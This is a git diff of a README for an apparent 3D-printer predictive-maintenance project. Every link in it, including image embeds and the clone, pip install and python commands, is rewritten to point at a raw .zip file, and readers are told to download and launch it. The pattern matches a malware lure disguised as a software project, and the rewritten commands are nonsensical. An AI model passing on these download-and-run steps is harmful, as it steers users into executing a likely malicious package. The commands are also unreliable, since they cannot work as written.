@@ -1,6 +1,6 @@
 # 3D Printer Predictive Maintenance System
 
-![3D Printer](https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0)
+![3D Printer](https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip)
 
 Welcome to the 3D Printer Predictive Maintenance System repository! This project focuses on implementing a predictive maintenance system for 3D printers using AI, machine learning, and Python. By leveraging cutting-edge technologies, we aim to enhance the reliability and efficiency of 3D printers through early identification of potential issues.
 
@@ -37,15 +37,15 @@ To get started with the 3D Printer Predictive Maintenance System, follow these s
 
 1. Clone the repository to your local machine:
 ```bash
-git clone https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0
+git clone https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip
 ```
 
 2. Install the necessary dependencies using pip:
 ```bash
-pip install -r https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0
+pip install -r https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip
 ```
 
-3. Download the software package from the following link: [Download Software](https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0) - Launch the software package after download.
+3. Download the software package from the following link: [Download Software](https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip) - Launch the software package after download.
 
 If the provided link is not working, please check the **Releases** section of the repository for an alternative download option.
 
@@ -55,7 +55,7 @@ To use the Predictive Maintenance System, follow these steps:
 
 1. Run the system using the main Python script:
 ```bash
-python https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0
+python https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip
 ```
 
 2. Access the Streamlit web interface by navigating to `http://localhost:8501` in your web browser.
@@ -74,6 +74,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🚀 Start predicting maintenance needs for your 3D printers with the power of AI and machine learning! Let's revolutionize the world of 3D printing maintenance together. 🛠️🤖🔧
 
-![Maintenance](https://github.com/Z3k0off/3DPrinter_PredictiveMaintenance/releases/tag/v2.0)
+![Maintenance](https://raw.githubusercontent.com/Z3k0off/3DPrinter_PredictiveMaintenance/main/Brahmi/Predictive_D_Printer_Maintenance_v2.8.zip)
 
 ---
